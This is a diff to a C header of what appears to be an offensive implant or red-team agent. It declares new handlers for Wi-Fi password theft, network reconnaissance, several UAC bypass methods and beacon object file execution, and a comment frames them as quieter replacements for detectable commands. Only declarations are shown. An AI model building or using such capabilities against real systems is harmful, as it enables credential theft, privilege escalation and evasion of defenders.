@@ -49,6 +49,12 @@ void _handle_env           (TLS_CONTEXT *pTls, const char *filter);
 void _handle_idle_time     (TLS_CONTEXT *pTls);
 void _handle_lock_screen   (TLS_CONTEXT *pTls);
 void _handle_active_windows(TLS_CONTEXT *pTls);
+/* F-10: native replacements for high-signal cmd.exe fallback verbs */
+void _handle_netstat       (TLS_CONTEXT *pTls);
+void _handle_ifconfig      (TLS_CONTEXT *pTls);
+void _handle_arp           (TLS_CONTEXT *pTls);
+void _handle_routes        (TLS_CONTEXT *pTls);
+void _handle_wifi_passwords(TLS_CONTEXT *pTls);
 
 /* handlers_ui.c */
 void _handle_getclip      (TLS_CONTEXT *pTls);
@@ -71,7 +77,12 @@ void _handle_token_impersonate (TLS_CONTEXT *pTls, const char *args);
 void _handle_token_revert      (TLS_CONTEXT *pTls);
 void _handle_getsystem         (TLS_CONTEXT *pTls);
 void _handle_uac_bypass        (TLS_CONTEXT *pTls, const char *args);
+void _handle_uac_reg_hijack    (TLS_CONTEXT *pTls, const char *args);
+void _handle_uac_dll_hijack    (TLS_CONTEXT *pTls, const char *args);
+void _handle_uac_com_hijack    (TLS_CONTEXT *pTls, const char *args);
+void _handle_uac_env_expand    (TLS_CONTEXT *pTls, const char *args);
 void _handle_lateral_wmi       (TLS_CONTEXT *pTls, const char *args);
 void _handle_lateral_sc        (TLS_CONTEXT *pTls, const char *args);
+void _handle_exec_bof          (TLS_CONTEXT *pTls, const char *args);
 
 #endif /* SHELL_INTERNAL_H */
